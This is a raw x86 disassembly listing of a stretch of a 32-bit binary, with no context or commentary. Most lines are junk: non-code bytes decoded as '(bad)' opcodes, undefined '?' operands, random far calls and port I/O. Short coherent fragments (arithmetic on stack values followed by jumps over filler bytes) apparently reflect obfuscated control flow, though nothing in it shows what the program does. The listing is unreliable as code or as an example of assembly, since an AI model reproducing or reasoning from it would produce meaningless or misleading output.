  40cf4e:	xchg   BYTE PTR [ebx],bh
  40cf50:	(bad)  
  40cf51:	in     eax,dx
  40cf52:	adc    esp,eax
  40cf54:	push   esp
  40cf55:	push   es
  40cf56:	mov    dh,0x1f
  40cf58:	sub    BYTE PTR [ebx-0x5d],al
  40cf5b:	hlt    
  40cf5c:	call   0x4e52:0x515929a4
  40cf63:	(bad)  
  40cf65:	xchg   esi,eax
  40cf66:	test   BYTE PTR [edx-0x67],dh
  40cf69:	and    BYTE PTR [ecx],cl
  40cf6b:	outs   dx,DWORD PTR ds:[esi]
  40cf6c:	cmp    esi,DWORD PTR [edi+0x76a1e8a2]
  40cf72:	inc    ecx
  40cf73:	xchg   ecx,eax
  40cf74:	ror    BYTE PTR [edx-0x49],0x63
  40cf78:	test   BYTE PTR [esi+0x201c6a6a],0xae
  40cf7f:	ret    
  40cf80:	inc    ecx
  40cf81:	jbe    0x40cf67
  40cf83:	push   ss
  40cf84:	jmp    0xa99eb3a6
  40cf89:	fmul   QWORD PTR [eax-0x71]
  40cf8c:	push   ebp
  40cf8d:	ret    
  40cf8e:	adc    BYTE PTR [esi+edx*4],0xf6
  40cf92:	mov    DWORD PTR [bx+si],edx
  40cf95:	xchg   ecx,eax
  40cf96:	in     al,dx
  40cf97:	or     DWORD PTR [eax+0x10a26314],ecx
  40cf9d:	lods   eax,DWORD PTR ds:[esi]
  40cf9e:	xchg   ebp,eax
  40cf9f:	mov    ah,0x5a
  40cfa1:	retf   
  40cfa2:	jecxz  0x40cf58
  40cfa4:	mov    DWORD PTR [ebp+0x8],eax
  40cfa7:	mov    eax,DWORD PTR [ebp-0x18]
  40cfaa:	xor    eax,ecx
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	cwde   
  40cfc9:	sbb    al,0xdd
  40cfcb:	cwde   
  40cfcc:	dec    esp
  40cfcd:	mov    DWORD PTR [esi+0x7e],edi
  40cfd0:	aas    
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40d041
  40cfd5:	lock retf 
  40cfd7:	mov    ds:0xcbd2a002,eax
  40cfdc:	outs   dx,BYTE PTR ds:[esi]
  40cfdd:	pop    es
  40cfde:	mov    ebx,0xd60d1931
  40cfe3:	mov    bl,BYTE PTR ds:0xdefe3a23
  40cfe9:	outs   dx,BYTE PTR ds:[esi]
  40cfea:	jb     0x40cff6
  40cfec:	retf   
  40cfed:	sub    bh,BYTE PTR ds:0xbb824018
  40cff3:	add    BYTE PTR [edx+0x56],0xd
  40cff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cff8:	retf   0x4cbf
  40cffb:	sub    cl,ah
  40cffd:	and    al,0xf6
  40cfff:	retf   
  40d000:	mov    al,ds:0x8f7b0f61
  40d005:	in     al,dx
  40d006:	ret    0x76b4
  40d009:	sbb    BYTE PTR [ebp-0x57],cl
  40d00c:	stos   BYTE PTR es:[edi],al
  40d00d:	pushf  
  40d00e:	aaa    
  40d00f:	int    0xaa
  40d011:	and    dl,BYTE PTR [edx-0x3e]
  40d014:	xor    al,0xd1
  40d016:	imul   ebx,DWORD PTR [edi],0xffffffbb
  40d019:	jno    0x40d067
  40d01b:	test   eax,0xc075ad5c
  40d020:	ins    DWORD PTR es:[edi],dx
  40d021:	in     al,0x68
  40d023:	ret    0xf2c0
  40d026:	sub    eax,0xf006c661
  40d02b:	mov    ds:0x77adcc7b,al
  40d030:	cwde   
  40d031:	sub    al,0x37
  40d033:	cli    
  40d034:	test   BYTE PTR [ebx+0x41],al
  40d037:	out    dx,eax
  40d038:	inc    ebp
  40d039:	ja     0x40cfe1
  40d03b:	mov    bl,0x6f
  40d03e:	jno    0x40d068
  40d040:	cmp    BYTE PTR [esi-0x4c],0xf
  40d044:	adc    al,0x62
  40d046:	outs   dx,BYTE PTR ds:[esi]
  40d047:	dec    esi
  40d048:	imul   DWORD PTR [ebx+eax*2+0x75b8a033]
  40d04f:	ins    BYTE PTR es:[edi],dx
  40d050:	fsubr  QWORD PTR [edi]
  40d052:	pop    ecx
  40d053:	and    al,0x69
  40d055:	in     eax,0x8a
  40d057:	aad    0xb5
  40d059:	in     al,0xd6
  40d05b:	lods   eax,DWORD PTR ds:[esi]
  40d05c:	pushf  
  40d05d:	call   0xf7ee:0xc66bd0ac
  40d064:	aam    0xa5
  40d066:	popa   
  40d067:	jae    0x40d064
  40d069:	hlt    
  40d06a:	jg     0x40d045
  40d06c:	enter  0x6c38,0xa6
  40d070:	cs mov dl,0xed
  40d073:	pop    edx
  40d074:	rcr    dl,0x4c
  40d077:	(bad)  
  40d078:	das    
  40d079:	push   esp
  40d07a:	sahf   
  40d07b:	sub    bl,dl
  40d07d:	inc    edx
  40d07e:	rcl    DWORD PTR [ecx+0x68f6d07d],1
  40d084:	rol    esi,cl
  40d086:	dec    ecx
  40d087:	lahf   
  40d088:	add    eax,0x534e34d2
  40d08d:	in     eax,dx
  40d08e:	cmp    al,0x4d
  40d090:	ss sbb al,0xde
  40d093:	jmp    0x36bfa3b7
  40d098:	rcl    bh,cl
  40d09a:	pop    esi
  40d09b:	xchg   DWORD PTR [ebx-0x6b],ebx
  40d09e:	into   
  40d09f:	jne    0x40d0c7
  40d0a1:	arpl   WORD PTR [ecx+0x1e5ecaeb],di
  40d0a7:	int    0xfd
  40d0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0aa:	xchg   DWORD PTR [ebx+0x3a03f396],ebp
  40d0b0:	lods   eax,DWORD PTR ds:[esi]
  40d0b1:	mov    bl,0x29
  40d0b3:	mov    eax,ds:0x928e59d6
  40d0b8:	pop    ds
  40d0b9:	and    ch,cl
  40d0bb:	fnstcw WORD PTR [ecx+ecx*2-0x16]
  40d0bf:	inc    ebp
  40d0c0:	ror    al,0x3c
  40d0c3:	sub    al,0xac
  40d0c5:	pushf  
  40d0c6:	jmp    0x80a2:0xf82f4375
  40d0cd:	retf   
  40d0ce:	adc    eax,0xc1b94af5
  40d0d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0d4:	pop    es
  40d0d5:	and    eax,0xb7cc16ea
  40d0da:	and    ah,BYTE PTR [esi+0x52afe5fa]
  40d0e0:	dec    ebp
  40d0e1:	loopne 0x40d0ed
  40d0e3:	iret   
  40d0e4:	pop    esp
  40d0e5:	dec    esp
  40d0e6:	ins    BYTE PTR es:[edi],dx
  40d0e7:	inc    edx
  40d0e8:	sbb    eax,DWORD PTR [edx]
  40d0ea:	mov    eax,0xeffc4ee8
  40d0ef:	test   BYTE PTR [ebx-0x7ab5602],ch
  40d0f5:	(bad)  
  40d0f6:	mov    bh,0x54
  40d0f8:	inc    edx
  40d0f9:	daa    
  40d0fa:	and    ecx,DWORD PTR [esi]
  40d0fc:	or     cl,BYTE PTR [ecx-0x48]
  40d0ff:	out    0xb5,al
  40d101:	mov    eax,ds:0x591a8d3e
  40d106:	pop    esi
  40d107:	mov    DWORD PTR [eax],0xd988261f
  40d10d:	push   ds
  40d10e:	pop    cx
  40d110:	mov    eax,ds:0x26fe1041
  40d115:	xor    edx,ecx
  40d117:	mov    ecx,DWORD PTR [ebp+0x8]
  40d11a:	lea    ecx,[edx+ecx*1+0x32729d]
  40d121:	cmp    ecx,eax
  40d123:	je     0x40d712
  40d129:	mov    edi,DWORD PTR [ebp-0x18]
  40d12c:	mov    eax,DWORD PTR [ebp+0x8]
  40d12f:	mov    edx,DWORD PTR [ebp+0x14]
  40d132:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d136:	mov    ecx,0x7510856
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	add    dh,0x4f
  40d160:	sbb    esp,DWORD PTR [ecx+0xd]
  40d163:	mov    edi,DWORD PTR [esi+0x7e]
  40d166:	aas    
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d153
  40d16b:	adc    ch,0xb9
  40d16e:	mov    ebp,0x8d4a6f7e
  40d173:	ins    DWORD PTR es:[edi],dx
  40d174:	imul   BYTE PTR [edi-0x13978b73]
  40d17a:	int3   
  40d17b:	in     eax,0xc4
  40d17d:	outs   dx,BYTE PTR ds:[esi]
  40d17e:	xor    al,0x55
  40d180:	pop    eax
  40d181:	push   eax
  40d182:	pusha  
  40d183:	fnstcw WORD PTR [edi+0x1b]
  40d186:	inc    ebp
  40d187:	cmc    
  40d188:	inc    ebx
  40d189:	cli    
  40d18a:	scas   al,BYTE PTR es:[edi]
  40d18b:	cdq    
  40d18c:	add    al,0x58
  40d18e:	adc    cl,BYTE PTR [eax]
  40d190:	fsub   st,st(2)
  40d192:	mov    ah,0x99
  40d194:	push   0x8939e0c6
  40d199:	push   ecx
  40d19a:	cmc    
  40d19b:	rol    DWORD PTR [eax],0x5d
  40d19e:	or     DWORD PTR [ebx+0x48],ebx
  40d1a1:	in     eax,0x9c
  40d1a3:	retf   0x1f2f
  40d1a6:	sub    esp,eax
  40d1a8:	popf   
  40d1a9:	call   0x917e:0x2dfe1220
  40d1b0:	in     al,dx
  40d1b1:	fwait
  40d1b2:	scas   eax,DWORD PTR es:[edi]
  40d1b3:	mov    cl,bl
  40d1b5:	mov    dh,0x4d
  40d1b7:	fist   DWORD PTR [eax-0x32]
  40d1ba:	into   
  40d1bb:	icebp  
  40d1bc:	dec    edx
  40d1bd:	mov    eax,ds:0x689a6518
  40d1c2:	xchg   edx,eax
  40d1c3:	ins    DWORD PTR es:[edi],dx
  40d1c4:	push   esp
  40d1c5:	test   DWORD PTR [ebp-0x41f4d581],0xe21284e2
  40d1cf:	sbb    bh,dh
  40d1d1:	jle    0x40d252
  40d1d3:	(bad)  
  40d1d4:	add    BYTE PTR [ecx],al
  40d1d6:	cmp    DWORD PTR es:[edi+0x5d88a766],edx
  40d1dd:	or     eax,0x76ae080a
  40d1e2:	inc    eax
  40d1e3:	mov    eax,0xb6942b35
  40d1e8:	add    DWORD PTR [esi-0x55],ebx
  40d1eb:	xchg   ebx,eax
  40d1ec:	out    0xc4,al
  40d1ee:	mov    ds:0x3770af03,al
  40d1f3:	dec    ecx
  40d1f4:	std    
  40d1f5:	sti    
  40d1f6:	sbb    BYTE PTR [esi+0x1812a2b1],ah
  40d1fc:	push   cs
  40d1fd:	adc    DWORD PTR [esi+0xd],0xffffff8a
  40d201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d202:	ss addr16 ret 0xa687
  40d207:	nop
  40d208:	data16 repz sahf 
  40d20b:	addr16 mov edx,0xf02c9aba
  40d211:	ficom  WORD PTR [ecx-0x6d]
  40d214:	sub    DWORD PTR gs:[edi+0x5a8b6000],esi
  40d21b:	sbb    cl,BYTE PTR [ebx+0x6eddd681]
  40d221:	gs jle 0x40d1d2
  40d224:	xchg   bh,ah
  40d226:	pop    esi
  40d227:	repz xor al,0x54
  40d22a:	int3   
  40d22b:	(bad)  [eax+0x74481aad]
  40d231:	cmc    
  40d232:	(bad)  
  40d233:	loop   0x40d218
  40d235:	jbe    0x40d1ef
  40d237:	and    dl,BYTE PTR [ebx-0x2c]
  40d23a:	sub    al,0x4e
  40d23c:	cmp    ebx,esp
  40d23e:	imul   ebx,DWORD PTR [ebx],0x26
  40d241:	or     BYTE PTR [ebx+edx*4+0x71],al
  40d245:	sub    edx,esi
  40d247:	ret    0x962d
  40d24a:	test   BYTE PTR [esi+0x4a],bh
  40d24d:	inc    esi
  40d24e:	xchg   ebx,eax
  40d24f:	sti    
  40d250:	pop    es
  40d251:	xchg   esp,eax
  40d252:	jl     0x40d1ee
  40d254:	xchg   ebx,eax
  40d255:	cmp    cl,al
  40d257:	neg    DWORD PTR [edx]
  40d259:	add    ebp,ebp
  40d25b:	xchg   esi,eax
  40d25c:	js     0x40d1fe
  40d25e:	xchg   edx,eax
  40d25f:	mul    ebp
  40d261:	in     eax,dx
  40d262:	jp     0x40d2a4
  40d264:	sub    al,0xcf
  40d266:	ds iret 
  40d268:	sub    eax,0xaa68ee4
  40d26d:	adc    al,0xdc
  40d26f:	fs jp  0x40d2ae
  40d272:	ror    BYTE PTR [eax+0x47cb7576],1
  40d278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d279:	not    BYTE PTR [edi]
  40d27b:	pusha  
  40d27c:	xor    eax,0xd47890c0
  40d281:	xchg   BYTE PTR [esi+0x6e],ch
  40d284:	adc    esp,esp
  40d286:	shr    BYTE PTR ds:0x6daba31a,1
  40d28c:	aam    0x50
  40d28e:	sbb    ebx,DWORD PTR [ebx+ebp*2]
  40d291:	push   ebp
  40d292:	xchg   esp,eax
  40d293:	outs   dx,BYTE PTR ds:[esi]
  40d294:	sahf   
  40d295:	jo     0x40d264
  40d297:	jns    0x40d225
  40d299:	pushf  
  40d29a:	imul   BYTE PTR [edi-0x8d9c84c]
  40d2a0:	stc    
  40d2a1:	mov    ebp,0xbbff0120
  40d2a6:	add    BYTE PTR [eax-0x7210a900],bh
  40d2ac:	test   BYTE PTR [edx],al
  40d2ae:	popf   
  40d2af:	jb     0x40d2e3
  40d2b1:	add    BYTE PTR [ebx+0x7d8b0855],cl
  40d2b7:	fmul   QWORD PTR [ecx+0x458b9704]
  40d2bd:	call   0x3349284d
  40d2c2:	ror    DWORD PTR [ebp+0x729d1084],0x32
  40d2c9:	add    BYTE PTR [ecx+0x458b0845],cl
  40d2cf:	call   0x422cbd
  40d2d4:	add    BYTE PTR [esi],ch
  40d2d6:	adc    al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	inc    esp
  40d2e2:	in     al,0x25
  40d2e4:	fs into 
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d26e
  40d2ee:	or     bh,ch
  40d2f0:	sub    al,0xec
  40d2f2:	sub    eax,0xc850df2c
  40d2f7:	jbe    0x40d310
  40d2f9:	dec    ebx
  40d2fa:	loope  0x40d372
  40d2fc:	sbb    al,0x6
  40d2fe:	js     0x40d295
  40d300:	push   edi
  40d301:	cld    
  40d302:	cmp    ebx,DWORD PTR [ebp-0xf]
  40d305:	lock ret 
  40d307:	pop    esp
  40d308:	sbb    eax,0x153f042a
  40d30d:	scas   eax,DWORD PTR es:[edi]
  40d30e:	pusha  
  40d30f:	pcmpgtw mm3,QWORD PTR cs:[ecx]
  40d313:	mov    ?,WORD PTR [eax]
  40d315:	pop    esi
  40d316:	push   ebx
  40d317:	sub    esp,DWORD PTR ds:0x99675f62
  40d31d:	mov    ecx,?
  40d31f:	outs   dx,BYTE PTR ds:[esi]
  40d320:	cmp    eax,0x16845865
  40d325:	dec    ebp
  40d326:	or     bh,0x19
  40d329:	mov    ebp,0x8f5fce8e
  40d32e:	push   bp
  40d330:	sbb    BYTE PTR [ecx-0x1a],al
  40d333:	imul   esi,DWORD PTR [ebx+ebp*8],0xfffffff1
  40d337:	aas    
  40d338:	pop    eax
  40d339:	outs   dx,BYTE PTR ds:[esi]
  40d33a:	(bad)  
  40d33b:	pusha  
  40d33c:	adc    eax,DWORD PTR [ebp-0x80]
  40d33f:	(bad)  
  40d340:	or     BYTE PTR [eax-0x80],ch
  40d343:	push   ecx
  40d344:	sub    BYTE PTR [edx],bl
  40d346:	pop    es
  40d347:	test   eax,0xb1c7775f
  40d34c:	xchg   ebp,eax
  40d34d:	jno    0x40d2fb
  40d34f:	aas    
  40d350:	cmp    esp,ebx
  40d352:	pop    ss
  40d353:	jnp    0x40d2fb
  40d355:	aam    0x25
  40d357:	xchg   ecx,eax
  40d358:	xchg   esi,eax
  40d359:	jno    0x40d315
  40d35b:	xor    ecx,DWORD PTR [ebx-0x1d]
  40d35e:	ins    BYTE PTR es:[edi],dx
  40d35f:	mov    cl,0x4e
  40d361:	sub    BYTE PTR [ebp+0x6b4a13fb],cl
  40d367:	imul   esp,DWORD PTR [edx-0x5c8909e7],0xabd01253
  40d371:	stc    
  40d372:	push   edx
  40d373:	cmp    al,0x58
  40d375:	cmp    al,0x23
  40d377:	jge    0x40d310
  40d379:	inc    ebx
  40d37a:	stc    
  40d37b:	push   eax
  40d37c:	test   eax,0xb61fb47
  40d381:	push   eax
  40d382:	push   esp
  40d383:	out    0xf1,al
  40d385:	jl     0x40d3a0
  40d387:	test   DWORD PTR [edx],0xb1ccdd91
  40d38d:	push   ebp
  40d38e:	fbstp  TBYTE PTR [ebp+0x2b]
  40d391:	sbb    ebp,DWORD PTR [ecx-0x5f]
  40d394:	pop    es
  40d395:	fadd   QWORD PTR [eax]
  40d397:	or     eax,0xcbe13175
  40d39c:	sub    esp,esp
  40d39e:	mov    ebx,0x8980281a
  40d3a3:	push   ebp
  40d3a4:	jle    0x40d3a8
  40d3a6:	and    edi,DWORD PTR [ebx-0x71f01e51]
  40d3ac:	icebp  
  40d3ad:	loop   0x40d335
  40d3af:	js     0x40d372
  40d3b1:	jmp    0x223a2ff6
  40d3b6:	xchg   ebp,eax
  40d3b7:	(bad)  
  40d3b8:	int    0x45
  40d3ba:	aaa    
  40d3bb:	mov    edx,0xda504387
  40d3c0:	dec    esi
  40d3c1:	inc    ebx
  40d3c2:	xchg   ebx,eax
  40d3c3:	pop    es
  40d3c4:	iret   
  40d3c5:	stos   BYTE PTR es:[edi],al
  40d3c6:	div    BYTE PTR [ecx+0x32]
  40d3c9:	iret   
  40d3ca:	mov    cl,0x3
  40d3cc:	push   edi
  40d3cd:	stos   BYTE PTR es:[edi],al
  40d3ce:	sub    DWORD PTR ds:0x79b10cd6,0x32f480d9
  40d3d8:	mov    bl,0x2
  40d3da:	mov    ecx,0x44fcf444
  40d3df:	sbb    DWORD PTR [ecx],esp
  40d3e1:	or     al,0x4d
  40d3e3:	(bad)  
  40d3e4:	mov    ah,0xb1
  40d3e6:	and    eax,0xcd748241
  40d3eb:	sbb    ebp,eax
  40d3ed:	mov    ds:0x7916f8f7,eax
  40d3f2:	add    eax,0x28e5d54
  40d3f7:	and    DWORD PTR [esi+0x63c27d9],esp
  40d3fd:	(bad)  
  40d3fe:	add    edi,DWORD PTR [ecx+0x7a02f3d9]
  40d404:	daa    
  40d405:	and    BYTE PTR [ecx+0x48dd521e],cl
  40d40b:	mov    ch,0xfb
  40d40d:	sbb    eax,0xa2ad9588
  40d412:	inc    edi
  40d413:	add    eax,DWORD PTR [eax]
  40d415:	int3   
  40d416:	push   0x78
  40d418:	in     al,0x11
  40d41a:	js     0x40d46a
  40d41c:	mov    edi,0xe0d66e27
  40d421:	adc    dl,BYTE PTR [eax+0x4213d936]
  40d427:	(bad)  
  40d428:	and    BYTE PTR [eax+edi*4],ch
  40d42b:	sar    edi,0x79
  40d42e:	mov    edx,DWORD PTR [ebp+0x14]
  40d431:	xor    eax,ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	mov    eax,DWORD PTR [esi-0x727002ff]
  40d44f:	jle    0x40d4cf
  40d451:	aas    
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d448
  40d456:	push   edi
  40d457:	fldcw  WORD PTR [ecx-0x44]
  40d45a:	jae    0x40d3fe
  40d45c:	je     0x40d474
  40d45e:	sub    al,0x2e
  40d460:	xchg   esi,eax
  40d461:	mov    ds:0x9f7e63ba,eax
  40d466:	and    DWORD PTR [eax],edx
  40d468:	xchg   BYTE PTR [eax],ah
  40d46a:	sbb    DWORD PTR [edi+0x646d97d9],edi
  40d470:	ror    BYTE PTR ds:0x88f74b59,1
  40d476:	into   
  40d477:	dec    esi
  40d478:	xchg   DWORD PTR [eax],eax
  40d47a:	mov    esi,0x766a7d2
  40d47f:	loope  0x40d4a2
  40d481:	clc    
  40d482:	jl     0x40d428
  40d484:	imul   ebx,ecx,0xffffff92
  40d487:	(bad)  
  40d489:	dec    ecx
  40d48a:	sub    esi,DWORD PTR [esi-0x69]
  40d48d:	push   es
  40d48e:	cld    
  40d48f:	xor    al,0x9a
  40d491:	fdiv   DWORD PTR [edi-0x54]
  40d494:	cmp    eax,esi
  40d496:	sub    eax,0x9b4f95cc
  40d49b:	in     al,dx
  40d49c:	es mov esi,0xe3b319bc
  40d4a2:	aad    0x95
  40d4a4:	pop    edi
  40d4a5:	push   esp
  40d4a6:	jl     0x40d43d
  40d4a8:	push   0x1f743e30
  40d4ad:	sub    eax,0xdeb92202
  40d4b2:	(bad)  [esi+0xf5c0d4b]
  40d4b8:	pop    ss
  40d4b9:	xor    eax,0xfb9a3cdd
  40d4be:	aam    0x96
  40d4c0:	pop    ds
  40d4c1:	loope  0x40d4c3
  40d4c3:	cdq    
  40d4c4:	xor    ah,BYTE PTR [edi-0x306b14c4]
  40d4ca:	push   ebx
  40d4cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4cc:	mov    ah,0xca
  40d4ce:	cmc    
  40d4cf:	pop    ecx
  40d4d0:	into   
  40d4d1:	mov    eax,0x1cad903b
  40d4d6:	mov    bh,0x32
  40d4d8:	outs   dx,DWORD PTR ds:[esi]
  40d4d9:	(bad)  
  40d4da:	cli    
  40d4db:	into   
  40d4dc:	call   0x2cfd6319
  40d4e1:	jmp    0x8eb8:0xe1a3e2c2
  40d4e8:	xor    DWORD PTR [ecx+edi*2],0xffffffbd
  40d4ec:	adc    BYTE PTR [ebx+0x72],bl
  40d4ef:	cmp    eax,0x323620ce
  40d4f4:	sti    
  40d4f5:	mov    esp,esp
  40d4f7:	lea    ebp,[eax-0x5f]
  40d4fa:	vxorpd ymm5,ymm2,YMMWORD PTR [ebp-0x68d49636]
  40d502:	or     al,0x85
  40d504:	or     BYTE PTR [edi+0x38cab572],dl
  40d50a:	cmp    dl,BYTE PTR [esi+0x36da92fa]
  40d510:	outs   dx,DWORD PTR ds:[esi]
  40d511:	sub    al,0x9
  40d513:	and    DWORD PTR [eax-0x6b],esi
  40d516:	out    0x5,al
  40d518:	bound  ebp,QWORD PTR gs:[eax-0x77]
  40d51c:	xchg   esi,eax
  40d51d:	push   edi
  40d51e:	inc    ebp
  40d51f:	outs   dx,DWORD PTR ds:[esi]
  40d520:	lods   eax,DWORD PTR ds:[esi]
  40d521:	dec    ebp
  40d522:	inc    eax
  40d523:	test   DWORD PTR [edi-0x37a02bd1],edi
  40d529:	inc    esp
  40d52a:	inc    edi
  40d52b:	jge    0x40d59c
  40d52d:	aad    0xde
  40d52f:	mov    edi,0x8652deb4
  40d534:	push   edi
  40d535:	mov    ebx,ebx
  40d537:	push   esp
  40d538:	and    dh,BYTE PTR [ebx+0x40fe9b3b]
  40d53e:	push   ebx
  40d53f:	pop    ebx
  40d540:	mov    eax,ds:0xff4a6476
  40d545:	push   esi
  40d546:	rep lods al,BYTE PTR ds:[esi]
  40d548:	mov    esi,0x6253fa82
  40d54d:	shl    DWORD PTR [ecx+0x6a6d690f],cl
  40d553:	xor    BYTE PTR ds:0xb5ae88,bh
  40d559:	jno    0x40d546
  40d55b:	aaa    
  40d55c:	repz call 0x6e355dac
  40d562:	(bad)  
  40d563:	jg     0x40d502
  40d565:	stc    
  40d566:	outs   dx,DWORD PTR ds:[esi]
  40d567:	jmp    esp
  40d569:	out    0x7c,eax
  40d56b:	icebp  
  40d56c:	ret    0xaf23
  40d56f:	sar    DWORD PTR [ebx],cl
  40d571:	sbb    ebx,ebp
  40d573:	mov    esp,0x94320594
  40d578:	mov    edx,0xe3c18692
  40d57d:	fstp   QWORD PTR [esp+edi*4]
  40d580:	push   0xffffff8f
  40d582:	icebp  
  40d583:	stc    
  40d584:	mov    ah,0x88
  40d586:	push   edi
  40d587:	cmp    eax,0x6e2aa6a6
  40d58c:	push   cs
  40d58d:	(bad)  
  40d58e:	mov    eax,0xf5287683
  40d593:	mov    al,0x93
  40d595:	std    
  40d596:	mov    edx,DWORD PTR [ebp-0x4]
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0x1905fe4c
  40d5ac:	not    edi
  40d5ae:	inc    eax
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d56a
  40d5b7:	fdiv   QWORD PTR [ebx]
  40d5b9:	in     al,dx
  40d5ba:	pop    edx
  40d5bb:	push   esi
  40d5bc:	mov    WORD PTR [ebx+0x32d73506],es
  40d5c2:	cmp    DWORD PTR [ebx],edx
  40d5c4:	or     BYTE PTR [edi-0x3656187a],ch
  40d5ca:	add    DWORD PTR [ecx-0x6d],edi
  40d5cd:	jle    0x40d61a
  40d5cf:	mov    eax,ds:0x5f6af9cc
  40d5d4:	popf   
  40d5d5:	ror    BYTE PTR [ecx],0x66
  40d5d8:	inc    eax
  40d5d9:	imul   ebp,DWORD PTR [esi+0x3ad52a9],0x1a
  40d5e0:	pop    ebp
  40d5e1:	mov    eax,0x39403c1d
  40d5e6:	cmp    bl,ch
  40d5e8:	lods   eax,DWORD PTR ds:[esi]
  40d5e9:	push   ebx
  40d5ea:	into   
  40d5eb:	adc    edx,edx
  40d5ed:	mov    eax,DWORD PTR [edx+0x1446abf]
  40d5f3:	arpl   WORD PTR cs:[esi+0x57],dx
  40d5f7:	and    DWORD PTR [eax+0x5b],0x80aeb795
  40d5fe:	pop    ebp
  40d5ff:	jnp    0x40d63c
  40d601:	sahf   
  40d602:	in     al,dx
  40d603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d604:	pop    eax
  40d605:	cs out dx,eax
  40d607:	mov    WORD PTR [ebx+ecx*4-0x4c],fs
  40d60b:	dec    BYTE PTR fs:[ecx]
  40d60e:	xor    BYTE PTR [ebx+0x47],0x6f
  40d612:	(bad)  
  40d613:	pop    eax
  40d614:	inc    ecx
  40d615:	fcomp  st(0)
  40d617:	jp     0x40d667
  40d619:	pusha  
  40d61a:	push   es
  40d61b:	retf   0x4c3e
  40d61e:	call   0xc61e:0xcbf694ac
  40d625:	or     al,0xd8
  40d627:	sbb    eax,0xd8418f2b
  40d62c:	mov    WORD PTR [ecx-0x42d17f8c],?
  40d632:	ret    0x13bf
  40d635:	sub    BYTE PTR [ebp-0x460beb9],bl
  40d63b:	push   ss
  40d63c:	imul   eax,edx,0x6a
  40d63f:	popf   
  40d640:	pop    ebx
  40d641:	cmp    DWORD PTR [edi-0x5528d550],ecx
  40d647:	adc    DWORD PTR [edx-0x1330f8a1],ecx
  40d64d:	jns    0x40d6bf
  40d64f:	mov    ?,WORD PTR [ebx+0x5ba361fb]
  40d655:	pusha  
  40d656:	inc    ecx
  40d657:	xchg   dl,dh
  40d659:	jmp    0xbb7a:0x63ca7d9d
  40d660:	outs   dx,BYTE PTR ds:[esi]
  40d661:	mov    ds:0x45f9d26c,al
  40d666:	adc    BYTE PTR [edi+0x11],ah
  40d669:	ret    0xb7a2
  40d66c:	(bad)  
  40d66d:	out    dx,eax
  40d66e:	jmp    0x40d609
  40d670:	jp     0x40d6b9
  40d672:	inc    DWORD PTR [ecx-0x3d]
  40d675:	or     eax,0xb43d809d
  40d67a:	xchg   ebx,eax
  40d67b:	inc    esi
  40d67c:	outs   dx,DWORD PTR ds:[esi]
  40d67d:	imul   edi,edi,0xe17cb998
  40d683:	mov    bl,0x15
  40d685:	in     al,0x93
  40d687:	or     al,BYTE PTR [esi+0x5e]
  40d68a:	retf   0x554d
  40d68d:	les    esi,FWORD PTR [esi-0x47e325e8]
  40d693:	jmp    0xd22a2453
  40d698:	sbb    dh,ah
  40d69a:	xchg   edx,eax
  40d69b:	sbb    DWORD PTR [edx-0x12],esp
  40d69e:	fdivr  DWORD PTR [edx+0x1cad32f]
  40d6a4:	xor    cl,BYTE PTR [eax+0x0]
  40d6a7:	add    cl,BYTE PTR [ebp-0x6273d31f]
  40d6ad:	cmp    BYTE PTR [edi+ecx*4-0x56bae94b],al
  40d6b4:	fld    QWORD PTR [ebx]
  40d6b6:	or     DWORD PTR [esi+edx*2],ebx
  40d6b9:	jp     0x40d724
  40d6bb:	xchg   edx,eax
  40d6bc:	mov    esp,0x17f27e64
  40d6c1:	repz push ebx
  40d6c3:	pop    edi
  40d6c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6c5:	adc    eax,0xa7415ba5
  40d6ca:	sub    BYTE PTR [esp+ebx*4-0x6a10e4c0],dh
  40d6d1:	dec    edx
  40d6d2:	imul   DWORD PTR [ecx]
  40d6d4:	dec    edx
  40d6d5:	mov    cl,dh
  40d6d7:	test   DWORD PTR [ecx-0x4f],edi
  40d6da:	jno    0x40d686
  40d6dc:	(bad)  
